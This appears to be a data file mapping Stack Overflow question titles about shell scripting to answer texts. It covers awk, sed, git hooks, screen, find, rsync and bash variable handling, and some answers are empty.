    "Find Git branch name in post-update hook [duplicate]": "The first parameter to the post-update hook is the branch reference in full - for instance I see 'refs/heads/master' for a push to 'origin master'. So an example hook script that just prints the branch modified is:\n#!/bin/sh\nbranch=$(git rev-parse --symbolic --abbrev-ref $1)\necho Update pushed to branch $branch\nexec git update-server-info\nTo illustrate, when the above is placed into your remote repository hooks/post-update file the following is printed when performing a push:\n% git push origin master\nCounting objects: 5, done\nWriting objects: 100% (3/3), 247 bytes, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nUnpacking objects: 100% (3/3), done.\nremote: Update pushed to branch master\nTo /tmp/xx/a\n    e02d9cd..ab14a08  master -> master\nThe new line beginning 'remote:' was output by our hook script.",
    "How to invoke ioctl in shell script?": "I wrote ioctl tool exactly for this purpose: https://github.com/jerome-pouiller/ioctl.\nCurrently, it is not possible to pass multiple argument to ioctl call. Have you an example where it would be usefull?\nIf you want to call ioctl(open(\"/dev/console\"), 30, 1);, you can run:\nioctl /dev/console 30 -v 1\nHowever, for most ioctl, you want to allocate a buffer and pass a pointer to this buffer in argument to ioctl call. In this case, just forget -v. ioctl will read/write buffer content from/to standard input/output. ioctl try to guess buffer size and direction from ioctl number.\nThe best is: ioctl understand many (around 2200) ioctl symbolic names. Thus you can call:\nioctl /dev/video0 VIDIOC_QUERYCAP > video_caps",
    "Run a command in a shell and keep running the command when you close the session": "screen! It's the best thing since sliced bread. (Yeah, I know others have already suggested it, but it's so good the whole world should join in and suggest it too.)\nscreen is like, like, ummmm ... like using VNC or the like to connect to a GUI destop, but for command shell windows. You can have several shell \"windows\" open at once in the same screen session. You can do stuff like:\nStart a screens session using \"screen -dR\" (get used to using -dR)\nrun some commands in one window\npress CTRL-A,C to create a new window open a file there in vim\npress CTRL-A,0 to go back to the first window and issue some command on the file you just edited\nCTRL-A, 1 to go back to your vim session\nCTRL-A, C for yet another window and maybe do \"sudo - su\" (because you just happen to need a full root shell)\nCTRL-A, 0 and start a background process\nCTRL-A, C to create yet a new window, \"tail -f\" the log for that background process\nCTRL-A, d to disconnect your screen then CTRL-D to disconnect from the server\nGo on vacation for three weeks\nLog on to the server again and issue \"screen -dR\" to connect to your existing screen session\ncheck the log in the the fourth window with CTRL-A, 3 (it's like you've been there watching it all the time)\nCTRL-A, 1 to pick up that vim session again\nI guess you're starting to get the picture now? =)\nIt's like magic. I've been using screen for longer than I can remember and I'm still totally amazed with how bloody great it is.\nEDIT: Just want to mention there's now also tmux. Very much like screen, but has some unique features, splitting the windows being the most prominent one.",
    "How to list only the file names in HDFS": "The following command will return filenames only:\nhdfs dfs -stat \"%n\" my/path/*\n:added at Feb 04 '21\nActually last few years I use\nhdfs dfs -ls -d my/path/* | awk '{print $8}'\nand\nhdfs dfs -ls my/path | grep -e \"^-\" | awk '{print $8}'",
    "How to display the first word of each line in my file using the linux commands?": "You can use awk:\nawk '{print $1}' your_file\nThis will \"print\" the first column ($1) in your_file.",
    "How to replace placeholder character or word in variable with value from another variable in Bash?": "Bash can do string replacement by itself:\ntemplate='my*appserver'\nserver='live'\ntemplate=\"${template/\\*/$server}\"\nSee the advanced bash scripting guide for more details on string replacement.\nSo for a bash function:\nfunction string_replace {\n    echo \"${1/\\*/$2}\"\n}\nAnd to use:\ntemplate=$(string_replace \"$template\" \"$server\")",
    "Changing an AIX password via script?": "You can try:\necho \"USERNAME:NEWPASSWORD\" | chpasswd",
    "Running php script (php function) in linux bash": "",
    "Fish shell: Check if argument is provided for function": "count is the right way to do this. For the common case of checking whether there are any arguments, you can use its exit status:\nfunction fcd\n    if count $argv > /dev/null\n        open $argv\n    else\n        open $PWD\n    end\nend\nTo answer your second question, test -d $argv returns true if $argv is empty, because POSIX requires that when test is passed one argument, it must \"Exit true (0) if $1 is not null; otherwise, exit false\". So when $argv is empty, test -d $argv means test -d which must exit true because -d is not empty! Argh!\nedit Added a missing end, thanks to Ismail for noticing",
    "mongo shell script won't let me include \"use <database>\"": "In a mongo script you can use the db.getSiblingDB('new_db_name') to get a reference of a new database. So, it it not mandatory to give the database name in the command line. You can use the script.js:\ndb = db.getSiblingDB('new_db_name');\nprint(db);\n\n// the rest of your code for database \"new_db_name\"\nand the output of this script is (invoked with mongo script.js):\nMongoDB shell version: 2.2.2\nconnecting to: test\nsag",
    "Is it possible to print the awk output in the same line": "From the manpage:\nORS         The output record separator, by default a newline.\nTherefore,\nawk 'BEGIN { ORS=\" \" }; { print $2 }' file",
    "for each dir create a tar file": "The script that you wrote will not work if you have some spaces in a directory name, because the name will be split, and also it will tar files if they exist on this level.\nYou can use this command to list directories not recursively:\nfind . -maxdepth 1 -mindepth 1 -type d\nand this one to perform a tar on each one:\nfind . -maxdepth 1 -mindepth 1 -type d -exec tar cvf {}.tar {}  \\;",
    "Use the contents of a file to replace a string using SED": "You can use the r command. When you find a 'fox' in the input...\n/fox/{\n...replace it with the empty string...\n    s/fox//g\n...and read the input file:\n    r f.html\n}\nIf you have a file such as:\n$ cat file.txt\nthe\nquick\nbrown\nfox\njumps\nover\nthe lazy dog\nfox dog\nthe result is:\n$ sed '/fox/{\n    s/fox//g\n    r f.html\n}' file.txt\nthe\nquick\nbrown\n\n    </div>\n  </div>\n  <br>\n  <div id=\"container2\">\n    <div class=\"question\" onclick=\"javascript:show('answer2')\";>\njumps\nover\nthe lazy dog\n dog\n    </div>\n  </div>\n  <br>\n  <div id=\"container2\">\n    <div class=\"question\" onclick=\"javascript:show('answer2')\";>\nEDIT: to alter the file being processed, just pass the -i flag to sed:\nsed -i '/fox/{\n    s/fox//g\n    r f.html\n}' file.txt\nSome sed versions (such as my own one) require you to pass an extension to the -i flag, which will be the extension of a backup file with the old content of the file:\nsed -i.bkp '/fox/{\n    s/fox//g\n    r f.html\n}' file.txt\nAnd here is the same thing as a one liner, which is also compatible with Makefile\nsed -i -e '/fox/{r f.html' -e 'd}'",
    "In a Linux shell how can I process each line of a multiline string?": "Use this (it is loop of reading each line from file file)\ncat file | while read -r a; do echo $a; done\nwhere the echo $a is whatever you want to do with current line.\nUPDATE: from commentators (thanks!)\nIf you have no file with multiple lines, but have a variable with multiple lines, use\necho \"$variable\" | while read -r a; do echo $a; done\nUPDATE2: \"read -r\" is recommended to disable backslashed (\\) chars interpretation (check mtraceur comments; supported in most shells). It is documented in POSIX 1003.1-2008 http://pubs.opengroup.org/onlinepubs/9699919799/utilities/read.html\nBy default, unless the -r option is specified, <backslash> shall act as an escape character. .. The following option is supported: -r - Do not treat a <backslash> character in any special way. Consider each to be part of the input line.",
    "Simple way to convert HH:MM:SS (hours:minutes:seconds.split seconds) to seconds": "Try awk. As a bonus, you can keep the split seconds.\necho \"00:20:40.25\" | awk -F: '{ print ($1 * 3600) + ($2 * 60) + $3 }'",
    "How to extract numbers from a string?": "You can use tr to delete all of the non-digit characters, like so:\necho toto.titi.12.tata.2.abc.def | tr -d -c 0-9",
    "Running node from a bash script": "It looks like you are trying to run node from within node. The error message came from node and it looks like node was trying to run the command /var/node/assets/js/update.js.\nI would make the shebang line specify bash rather than node.\nThe top line\n#!/usr/bin/env node\nmeans that what follows should be JavaScript code, not bash.",
    "How to enable confirmation alert when using 'rm' command to delete files / folders? [closed]": "You can use the -i flag:\nrm -i someFile.txt\nIf you're concerned you may forget to do this, you could alias the rm command:\nalias rm=\"rm -i\"\nIf you place this alias in one of the files sourced when you start a session (e.g., .bashrc), you'll have it available in all your future terminal sessions.",
    "results of wc as variables": "In pure bash: (no awk)\na=($(wc file.txt))\nlines=${a[0]}\nwords=${a[1]}\nchars=${a[2]}\nThis works by using bash's arrays. a=(1 2 3) creates an array with elements 1, 2 and 3. We can then access separate elements with the ${a[indice]} syntax.\nAlternative: (based on gonvaled solution)\nread lines words chars <<< $(wc x)\nOr in sh:\na=$(wc file.txt)\nlines=$(echo $a|cut -d' ' -f1)\nwords=$(echo $a|cut -d' ' -f2)\nchars=$(echo $a|cut -d' ' -f3)",
    "ZSH/Shell variable assignment/usage": "Two things are going wrong here.\nFirstly, your first snippet is not doing what I think you think it is. Try removing the second line, the echo. It still prints the date, right? Because this:\nDATE= date +'20%y-%m-%d'\nIs not a variable assignment - it's an invocation of date with an auxiliary environment variable (the general syntax is VAR_NAME=VAR_VALUE COMMAND). You mean this:\nDATE=$(date +'20%y-%m-%d')\nYour second snippet will still fail, but differently. Again, you're using the invoke-with-environment syntax instead of assignment. You mean:\n# note the lack of a space after the equals sign\nFILE=\"~/path/to/_posts/$DATE-$1.markdown\"\nI think that should do the trick.\nDisclaimer\nWhile I know bash very well, I only started using zsh recently; there may be zshisms at work here that I'm not aware of.",
    "untar filename.tr.gz to directory \"filename\"": "tar -xzvf filename.tar.gz -C destination_directory",
    "How to run PHP exec() as root?": "",
    "I can't find my MinGW shell after installing with GUI installer": "simply you could run it from the following batch file:\ne.g. C:\\MinGW\\msys\\1.0\\msys.bat (if you installed your mingw in c drive)\nfor more info. about mysys, check this",
    "Editing Multiple files in vi with Wildcards": "vi supports having multiple files available for editing. :n goes to the next file, :N goes to the previous. Use :h arglist for more information.",
    "Shell run/execute php script with parameters": "",
    "How to return exit code 0 from a failed command": "Simply append return 0 to the function to force a function to always exit successful.\nfunction a() {\n  ls aaaaa 2>&1\n  return 0\n}\n\na\necho $? # prints 0\nIf you wish to do it inline for any reason you can append || true to the command:\nls aaaaa 2>&1 || true\necho $? # prints 0\nIf you wish to invert the exit status simple prepend the command with !\n! ls aaaaa 2>&1\necho $? # prints 0\n\n! ls /etc/resolv.conf 2>&1\necho $? # prints 1\nAlso if you state what you are trying to achieve overall we might be able to guide you to better answers.",
    "Bash For-Loop on Directories": "Do this instead for the echo line:\n echo $(basename \"$i\")",
    "How do I move a relative symbolic link?": "You can turn relative paths into full paths using readlink -f foo. So you would do something like:\nln -s $(readlink -f $origlink) $newlink\nrm $origlink\nEDIT:\nI noticed that you wish to keep the paths relative. In this case, after you move the link, you can use symlinks -c to convert the absolute paths back into relative paths.",
    "How to use \"cmp\" to compare two binaries and find all the byte offsets where they differ?": "I think cmp -l file1 file2 might do what you want. From the manpage:\n-l  --verbose\n      Output byte numbers and values of all differing bytes.\nThe output is a table of the offset, the byte value in file1 and the value in file2 for all differing bytes. It looks like this:\n4531  66  63\n4532  63  65\n4533  64  67\n4580  72  40\n4581  40  55\n[...]\nSo the first difference is at offset 4531, where file1's decimal octal byte value is 66 and file2's is 63.",
    "Redirect standard input dynamically in a bash script": "First of all stdin is file descriptor 0 (zero) rather than 1 (which is stdout).\nYou can duplicate file descriptors or use filenames conditionally like this:\n[[ some_condition ]] && exec 3<\"$filename\" || exec 3<&0\n\nsome_long_command_line <&3\nNote that the command shown will execute the second exec if either the condition is false or the first exec fails. If you don't want a potential failure to do that then you should use an if / else:\nif [[ some_condition ]]\nthen\n    exec 3<\"$filename\"\nelse\n    exec 3<&0\nfi\nbut then subsequent redirections from file descriptor 3 will fail if the first redirection failed (after the condition was true).",
    "cp command to overwrite the destination file which is a symbolic link": "Tell cp to remove it first.\ncp --remove-destination c.txt b.txt",
    "What is the use/meaning of \"#!/bin/sh\" in shell scripting?": "The sha-bang ( #!) [1] at the head of a script tells your system that this file is a set of commands to be fed to the command interpreter indicated. The #! is actually a two-byte [2] magic number, a special marker that designates a file type, or in this case an executable shell script (type man magic for more details on this fascinating topic). Immediately following the sha-bang is a path name. This is the path to the program that interprets the commands in the script, whether it be a shell, a programming language, or a utility. This command interpreter then executes the commands in the script, starting at the top (the line following the sha-bang line), and ignoring comments. [3]\nSource: http://tldp.org/LDP/abs/html/sha-bang.html#MAGNUMREF",
    "How to use environment variables with supervisor, gunicorn and django (1.6)": "OK, I guess I got it.\nI had tried including\nenvironment=SECRET_KEY=\"secret_key_with_non_alphanumeric_chars\"\nin the conf file for supervisor but it didn't like the non alphanumeric chars and I didn't want to have my key in the conf file as I have it in git.\nAfter loking at supervisor's docs I had also tried with:\nHOME=\"/home/django\", USER=\"django\"\nbut didn't work.\nFinally I tried with this and is working now!:\nenvironment=HOME=\"/home/django\", USER=\"django\", SECRET_KEY=$SECRET_KEY\nMaybe although it's working it's not the best solution. I'd be happy to learn more.\nEDIT:\nFinally, Ewan made me see that using the bash for setting the env vars wouldn't be the best option. So one solution, as pointed by #Ewan, would be to use:\n[program:my_project]\n...\nenvironment=SECRET_KEY=\"secret_key_avoiding_%_chars\"\nAnother solution I found, for those using virtualenv would be to export the env vars in the \"activate\" script of the virtualenv, that is, edit your virtualenv/bin/activate file and add at the end your SECRET_KEY.\nThis way you can use % chars as generated by key generators for django and is valid if you don't use supervisor.\nI restarted my server without logging to check that it worked. With this option I don't have to edit my keys, I can keep my conf files versioned and it works whether I use supervisor, upstart or whatever (or nothing, just gunicorn).\nAnyway, I know I haven't discovered anything new (well @Ewan raised an issue with supervisor) but I'm learning things and hope this can be useful to someone else.",
    "On Windows what is the difference between Git Bash vs Windows Power Shell vs Command prompt": "Git bash is bash, which is IIRC the default shell on MacOS as well as (AFAIK) most Linux distros. It is not the default shell on Windows, although several implementations exist (CygWin, MinGW, ...).\nGit is bundled with a number of POSIX (UNIX/Linux/etc.) utilities / commands in addition to bash; in order to avoid \"collisions\" with similarly named Windows commands, the most common installation option is to install bash in such a way that the other POSIX commands are only available when running bash. The Git installer will create a shortcut to launch this \"private\" version of bash, hence \"git bash\".\nThe Windows command prompt runs the default Windows shell, CMD.EXE, which is a derivative of the old MS-DOS command shell, COMMAND.COM. It is much less capable than most POSIX shells; for example, it did not until relatively recently support an if/then/else construct, and it does not support shell functions or aliases (although there are some workarounds for these limitations).\nPowerShell is more of a scripting environment. I'd compare it to Perl on UNIX/Linux systems -- much more powerful than the standard shell, but not necessarily something I'd want to use at the command line.\nOne thing to be aware of is that some of the nicer PowerShell features may require you to update your version of PowerShell -- the version bundled with Windows is typically a few years old. And updating PowerShell usually requires admin privilege; depending on the version, you may also need to update the .NET framework.\nIf I were a Mac person trying to adapt to Windows ... it depends. In the short term it would be easier to use something familiar like bash. But long term, you -- and more importantly, your potential users -- may not want to be dependent on a third party tool, especially since for Windows users that will typically present an additional learning curve.\nAs to which to use when ... it really depends on what you're trying to accomplish -- both in terms of technical functionality and the interface you want to present to your users. As noted above, I'd consider PowerShell more appropriate for scripting than the CLI, unless you just need to run a cmdlet (either a built-in or one you've created yourself).",
    "run bash command in new shell and stay in new shell after this command executes": "You can achieve something similar by abusing the --rcfile option:\nbash --rcfile <(echo \"export PS1='> ' && ls\")\nFrom bash manpage:\n--rcfile file\nExecute commands from file instead of the system wide initialization file /etc/bash.bashrc and the standard personal initialization file ~/.bashrc if the shell is interactive",
    "Vagrant provisioning shell vs puppet vs chef": "The following article concerns yet another CM tool (ansible), but I think the author does an excellent job of explaining the benefits of transitioning away from shell scripts.\nhttp://devopsu.com/blog/ansible-vs-shell-scripts/\nquote 1:\nWhat really surprised me was the response from some of these more famous devs. They basically said, \"This is really cool, but I probably won't read it since my manual-install/shell-script workflow is fine for now.\"\nI was a little shocked, but once I thought about it for a few minutes, I realized that their choice was perfectly sane and rational given what they knew about CM tools.\nquote 2:\nFor them, using a CM tool meant weeks of effort learning complex concepts, struggling with a complex installation process, and maintaining that complex system over time. They were somewhat aware of the benefits, but the costs of using a CM tool just seemed too high to make it worth the effort.\nThe benefits over shell scripts are summarized at the end and I think they apply to all CM tools, puppet, chef, salt, ansible...\nWhich method is most likely to end up in source control?\nWhich method can be run multiple times safely with confidence?\nWhich method can easily be run against multiple servers?\nWhich method actually verifies (tests) your server for correctness?\nWhich method can target certain servers easily (web, db, etc)?\nWhich method supports easily templating your configuration files?\nWhich method will grow to easily support your whole stack?\nHope this helps.",
    "Checking for interactive shell in a Python script": "This is often works well enough\nimport os, sys\nif os.isatty(sys.stdout.fileno()):\n    ...",
    "Remove quotes with SED": "Why use sed?\n| tr -d '\"'\nRight tool for the right job.",
    "Get the last 4 characters of output from standard out": "How about tail, with the -c switch. For example, to get the last 4 characters of \"hello\":\necho \"hello\" | tail -c 5\nello\nNote that I used 5 (4+1) because a newline character is added by echo. As suggested by Brad Koch below, use echo -n to prevent the newline character from being added.",
    "Run C# code on linux terminal": "Of course it can be done and the process is extremely simple.\nHere I am explaining the steps for Ubuntu Linux.\nOpen terminal:\nCtrl + Alt + T\nType\ngedit hello.cs\nIn the gedit window that opens paste the following example code:\nusing System;\nclass HelloWorld {\n  static void Main() {\n    Console.WriteLine(\"Hello World!\");\n  }\n}\nSave and close gedit.\nBack in terminal type:\nsudo apt update\nsudo apt install mono-complete\nmcs -out:hello.exe hello.cs\nmono hello.exe\nOutput:\nHello World!",
    "A better way to execute multiple MySQL commands using shell script": "I think you can execute MySQL statements from a text file, for example\nhere is the cmds.txt file which contains MySQL commands:\nselect colA from TableA;\nselect colB from TableB;\nselect colC from TableC;\nTo execute them using shell script, type\nmysql -h$host -u$user -p$password db_dbname < cmds.txt\nThis way, you separate your MySQL commands from your shell script.\nYou may want your script to display progress information to you. For this you can invoke mysql with \"--verbose\" option.\nFor more information, see https://dev.mysql.com/doc/refman/5.6/en/mysql-batch-commands.html",
    "How can I launch ipython from shell, by running 'python ...'?": "To start IPython shell directly in Python:\nfrom IPython import embed\n\na = \"I will be accessible in IPython shell!\"\n\nembed()\nOr, to simply run it from command line:\n$ python -c \"from IPython import embed; embed()\"\nembed will use all local variables inside shell.\nIf you want to provide custom locals (variables accessible in shell) take a look at IPython.terminal.embed.InteractiveShellEmbed",
    "using alias in shell script? [duplicate]": "source your script, don't execute it like ./foo.sh or sh foo.sh\nIf you execute your script like that, it is running in sub-shell, not your current.\nsource foo.sh  \nwould work for you.",
    "remove all of a file type from a directory and its children": "The man page of rm says:\n -r, -R, --recursive\n          remove directories and their contents recursively\nThis means the flag -r is expecting a directory. But *.xml is not a directory.\nIf you want to remove the all .xml files from current directory recursively below is the command:\nfind . -name \"*.xml\" -type f|xargs rm -f",
    "Shell Script : How to check if variable is null or no": "Try following, you should change from -z to -n as follows and add $ to your variable too.\nif [[ -n \"$list_Data\" ]]\nthen\n    echo \"not Empty\"\nelse\n    echo \"empty\"\nfi\nExplanation: From man test page as follows(It checks if a variable is having any value or not. If it has any value then condition is TRUE, if not then it is FALSE.)\n   -n STRING\n          the length of STRING is nonzero",
    "How to find out activity names in a package? android. ADB shell": "",
    "Append text to file using sed": "Use $ a.\nsed -i \"$ a some text\" somefile.txt",
    "ImageMagick command to convert and save with same name": "Another way:\nconvert *.jpg -resize 80% -set filename:f '%t' ../'%[filename:f].jpg'\nWill place converted files in the folder above.\nThe option -set filename:f '%t' sets the property filename:f to the current filename without the extension. Properties beginning with filename: are a special case that can be referenced in the output filename. Here we set it to ../'%[filename:f].jpg, which ends up being the image filename with the extension replaced with .jpg in the parent directory.\nDocumentation references:\n-set documentation, which mentions the filename: special case\n%t and other Format and Print Image Properties",
    "How can I launch powershell.exe with the \"default\" colours from the PowerShell shortcut?": "Edit your profile script (pointed to by $profile) and set the desired colors yourself:\n# set regular console colors\n[console]::backgroundcolor = \"darkmagenta\"\n[console]::foregroundcolor = \"darkyellow\"\n\n# set special colors\n\n$p = $host.privatedata\n\n$p.ErrorForegroundColor    = \"Red\"\n$p.ErrorBackgroundColor    = \"Black\"\n$p.WarningForegroundColor  = \"Yellow\"\n$p.WarningBackgroundColor  = \"Black\"\n$p.DebugForegroundColor    = \"Yellow\"\n$p.DebugBackgroundColor    = \"Black\"\n$p.VerboseForegroundColor  = \"Yellow\"\n$p.VerboseBackgroundColor  = \"Black\"\n$p.ProgressForegroundColor = \"Yellow\"\n$p.ProgressBackgroundColor = \"DarkCyan\"\n\n# clear screen\nclear-host",
    "PostgreSQL - pg_config -bash: pg_config: command not found": "you can install postgresql-devel to get that. in rpm based distro\nyum install postgresql-devel\nwill work\nor use\nyum provides \"*/pg_config\"\nto get the exact package",
    "How do I recursively list all directories at a location, breadth-first?": "The find command supports -printf option which recognizes a lot of placeholders.\nOne such placeholder is %d which renders the depth of given path, relative to where find started.\nTherefore you can use following simple one-liner:\nfind -type d -printf '%d\\t%P\\n' | sort -r -nk1 | cut -f2-\nIt is quite straightforward, and does not depend on heavy tooling like perl.\nHow it works:\nit internally generates list of files, each rendered as a two-field line\nthe first field contains the depth, which is used for (reverse) numerical sorting, and then cut away\nresulting is simple file listing, one file per line, in the deepest-first order",
    "How to check if sed has changed a file": "A bit late to the party but for the benefit of others, I found the 'w' flag to be exactly what I was looking for.\nsed -i \"s/$pattern/$new_pattern/w changelog.txt\" \"$filename\"\nif [ -s changelog.txt ]; then\n    # CHANGES MADE, DO SOME STUFF HERE\nelse\n    # NO CHANGES MADE, DO SOME OTHER STUFF HERE\nfi\nchangelog.txt will contain each change (ie the changed text) on it's own line. If there were no changes, changelog.txt will be zero bytes.\nA really helpful sed resource (and where I found this info) is http://www.grymoire.com/Unix/Sed.html.",
    "How to suppress all output of diff in shell scripting?": "If all you want to know is whether the two files differ, cmp is the better tool.\nif cmp -s file1 file2; then\n   echo Files not changed.\nfi",
    "How can I add a new line in a Bash string? [duplicate]": "$ echo \"a\\nb\"\na\\nb\n$ echo -e \"a\\nb\"\na\nb",
    "How to use su command over adb shell?": "",
    "Copy files while skipping over files that exist - Unix [closed]": "Always use rsync for copying files, because It Is Great.\nTo ignore existing files:\nrsync --ignore-existing --recursive /src /dst\nDo read the manual and search around for many, many great examples. Especially the combination with ssh makes rsync a great tool for slow and unreliable connections on account of its --partial option. Add --verbose to see which files are being copied. Be sure to check out the plethora of options concerning preservation of permissions, users and timestamps, too.",
    "\"~/Desktop/test.txt: No such file or directory\"": "Try replacing ~ with $HOME. Tilde expansion only happens when the tilde is unquoted. See info \"(bash) Tilde Expansion\".\nYou could also do file=~/Desktop without quoting it, but if you ever replace part of this with something with a field separator in it, then it will break. Quoting the values of variables is probably a good thing to get into the habit of anyway. Quoting variable file=~/\"Desktop\" will also work but I think that is rather ugly.\nAnother reason to prefer $HOME, when possible: tilde expansion only happens at the beginnings of words. So command --option=~/foo will only work if command does tilde expansion itself, which will vary by command, while command --option=\"$HOME/foo\" will always work.",
    "Powering off Android Things": "Android (and by extension, Android Things) should have no problem with a sudden loss of power. The core operating system is housed in read-only partitions on the file system, so there is no risk of corrupting the OS from a failed in-flight write.\nAlso, reboot -p should still work if you wanted to use that in testing or development. Going even farther with it, you could connect a Gpio with an InputDriver that emits KEYCODE_POWER to add your own power button back to the system if you felt you needed it.",
    "What is the difference between \"source script.sh\" and \"./script.sh\"?": "source script.sh runs the script within the current process, thus all variable assignments are preserved as variables even after the script finishes (and don't have to be explicitly export'd).\n./script.sh just runs the script in a subprocess, and any variables which are assigned disappear after the script is done.",
    "Take the last part of the folder path in shell": "You're right--it's a quick command:\nbasename \"$PWD\"",
    "Is it OK to use the same input file as output of a piped command?": "No, it is not ok. All commands in a pipeline execute at the same time, and the shell prepares redirections before executing the commands. So, it is likely that the command will overwrite the file before cat reads it.\nYou need sponge(1) from moreutils.",
    "How can I check the version of sed in OS X?": "This probably isn't the answer you're looking for, but you can't. Mac OS X sed has no option to show the version number.\nThere is not even a version number in the binary:\n$ strings $(which sed)\n$FreeBSD: src/usr.bin/sed/compile.c,v 1.28 2005/08/04 10:05:11 dds Exp $\n$FreeBSD: src/usr.bin/sed/main.c,v 1.36 2005/05/10 13:40:50 glebius Exp $\n$FreeBSD: src/usr.bin/sed/misc.c,v 1.10 2004/08/09 15:29:41 dds Exp $\n$FreeBSD: src/usr.bin/sed/process.c,v 1.39 2005/04/09 14:31:41 stefanf Exp $\n@(#)PROGRAM:sed  PROJECT:text_cmds-88\nmalloc\n%lu: %s: unexpected EOF (pending }'s)\n0123456789/\\$\n%lu: %s: command expected\n%lu: %s: invalid command code %c\n%lu: %s: command %c expects up to %d address(es), found %d\n%lu: %s: unexpected }\n%lu: %s: extra characters at the end of %c command\n%lu: %s: command %c expects \\ followed by text\n%lu: %s: extra characters after \\ at the end of %c command\n%lu: %s: filename expected\nw command\nread command\nbranch\nlabel\n%lu: %s: empty label\n%lu: %s: substitute pattern can not be delimited by newline or backslash\n%lu: %s: unterminated substitute pattern\n%lu: %s: extra text at the end of a transform command\n%lu: %s: unterminated regular expression\n%lu: %s: expected context address\nrealloc\n%lu: %s: whitespace after %s\n%lu: %s: duplicate label '%s'\n%lu: %s: RE error: %s\n%lu: %s: \\ can not be used as a string delimiter\n%lu: %s: newline can not be used as a string delimiter\n%lu: %s: unbalanced brackets ([])\nbin/sed\nUnix2003\n123456789\n%lu: %s: \\%c not defined in the RE\n%lu: %s: unescaped newline inside substitute pattern\n%lu: %s: unterminated substitute in regular expression\n%lu: %s: more than one number or 'g' in substitute flags\n%lu: %s: overflow in the 'N' substitute flag\n%lu: %s: no wfile specified\n%lu: %s: bad flag in substitute command: '%c'\n%lu: %s: transform pattern can not be delimited by newline or backslash\n%lu: %s: unterminated transform source string\n%lu: %s: unterminated transform target string\n%lu: %s: transform strings are not the same length\n%lu: %s: undefined label '%s'\n%lu: %s: unused label '%s'\nEae:f:i:ln\nsetlinebuf() failed\nstdout\n\"%s\"\n ...\"\n-i may not be used with stdin\nstdin\nrename()\n%s: %s %s\nin-place editing only\nworks for regular files\n%s: name too long\n%s/.!%ld!%s\n%s: %s\nusage: sed script [-Ealn] [-i extension] [file ...]\n       sed [-Ealn] [-i extension] [-e script] ... [-f script_file] ... [file ...]\nfirst RE may not be empty\nRE error: %s\n%lu: %s: \\%d not defined in the RE\nCOLUMNS\n\\abfrtv\n\\%03o",
    "How can I make bash treat undefined variables as errors?": "You can use:\nset -u\nat the start of your script to throw an error when using undefined variables.\n-u\nTreat unset variables and parameters other than the special parameters \"@\" and \"*\" as an error when performing parameter expansion. If expansion is attempted on an unset variable or parameter, the shell prints an error message, and, if not interactive, exits with a non-zero status.",
    "Passing argument containing space in shell script": "You must wrap the $@ in quotes, too: \"$@\"\nThis tells the shell to ignore spaces in the arguments; it doesn't turn all arguments into a very long string.",
    "Advantages and disadvantages between zsh and emacs' (e)shell": "Regarding M-x eshell:\nEshell is not a stand-alone shell; it's implemented in pure elisp, so can't be run outside emacs, which is why it's not one of the standard shells. It doesn't have its own scripting language like bash/zsh/etc. have; it has elisp, and some command interpretation stuff to make calling elisp a little cleaner.\nI can't speak to zsh vs eshell, but I've mostly switched from bash to eshell. 95% of the time, eshell does everything I want or need without any problems. I don't use it for ssh. Also, you can't background a process once it's started (but you can start it backgrounded).\nIt's going to be really hard, because zsh has a full scripting language, whereas eshell is basically an interface to the elisp interpreter. What are you looking for in an interactive shell? Eshell can probably do most of it. Conditional statements and loops on the command line? Sure. Aliases, functions, wildcards, programmable completion? Sure.\nThe way I migrated was to basically start from scratch. Every time I ran into something that I didn't like or I wished it did, I'd figure out how to get it to do what I want. For example, eshell uses pcomplete.el for programmable completion, so adding completion functions is pretty easy.\nIntegration with emacs is the big win for me. You can have elisp functions piped to shell commands. For a silly example, try:\nmessage \"hello world\" | cut -f 1 -d ' '\nSome commands (notably grep) get put in emacs buffers, so e.g. you can quickly jump to the results.\nDepends on how much time you really spend in emacs. If you do everything in emacs, it's useful, because sometimes it's easier to pipe together elisp commands with other commands through eshell. If you don't find yourself copy&pasting between emacs and your shell too frequently, it's probably not going to be a win, and you're going to have to spend time customizing it to the point you're comfortable with it.\nAs an alternative to eshell, M-x shell runs your normal shell underneath which interprets all the commands (so doesn't have access to elisp functions), while command-line editing (and therefore programmable completion, history, etc.) is done by emacs. I use it for ssh.\nOne other alternative is M-x term, which is a terminal emulator inside emacs, and usually runs a shell underneath, and the shell does all of its normal things. Then there's absolutely no conversion/adaptation steps required.",
    "How to create a zip file in the same format as the Finder's \"Compress\" menu item?": "I have a ruby script that makes iPhone App Store builds for me, but the zips it was generating wouldn't get accepted by iTunes Connect. They were accepted if I used Finder's \"Compress\" function.\nmillenomi's answer came close for me, but this command is what ended up working. iTunes Connect accepted my build, and the app got approved and can be downloaded no problem, so it's tested.\nditto -c -k --sequesterRsrc --keepParent AppName.app AppName.zip",
    "Assignment of variables with space after the (=) sign?": "In the example PWD= /bin/pwd, the variable PWD is set to the empty string before executing the command /bin/pwd. The change only takes effect for that line.\nThis can be useful to make a temporary change to a variable for the purposes of running a command, without affecting the original value. Another example of this would be when using read, to set a different IFS:\nIFS=, read a b c <<<\"comma,separated,list\"\nThis sets the field separator to a comma so that a, b and c are read correctly. After this line, IFS returns to the default value, so the rest of the script isn't affected.\nPerhaps on some systems, the output of the command pwd is affected by the value of the variable PWD, so doing this prevents problems caused by PWD being overwritten elsewhere.",
    "\"tput: No value for $TERM and no -T specified \" error logged by CRON process": "Something in the script is calling the tput binary. tput attempts to inspect the $TERM variable to determine the current terminal so it can produce the correct control sequences. There isn't a terminal when cron is running so you get that error from tput.\nYou can either manually assign a TERM value to the cron job (likely dumb or something similar to that) or (and this is likely the better solution) you can find out what is calling tput and remove that call.",
    "Terminal vs Console vs Shell vs Command Prompt? [closed]": "Yes, there is a lot of confusion about these terms. I'll give it a stab, but with the proviso that this is really semantics and the terms are used interchangeably in everyday speech :\n\"Shell\" is the term used for any program which runs others. It wraps around another program, hence its name. So for example, Windows Explorer is a shell, even though very few people would call it one. In all the languages and platforms I have used, any program can be a shell.\nEDIT: I did not define a \"terminal\". It gets its name from being the end-point of communication with the user. Specifically it was the typewriter device used for end-user communication. Today it is rather more general, and can mean a pseudo-terminal (pts in Linux ps -ef), which is a character-based session managed by a GUI. On Windows this would be called a \"console window\".\n\"Console\" means something specific, but different, on Windows and UNIX. On UNIX originally it was the tty (TeleTYpewriter, a VDU was a \"glass teletype\") that was physically plugged into the machine, not even via a dongle (I go back a long way with UNIX). It was the terminal that sent and received startup and closedown messages, and alerts such as PANICs. Both bash and Korn shell scripts can run as pseudo-daemons without a TTY/console.\nThe term \"console\" is often confused with the more accurate \"standard-input\", \"standard-output\", and \"standard-error\" 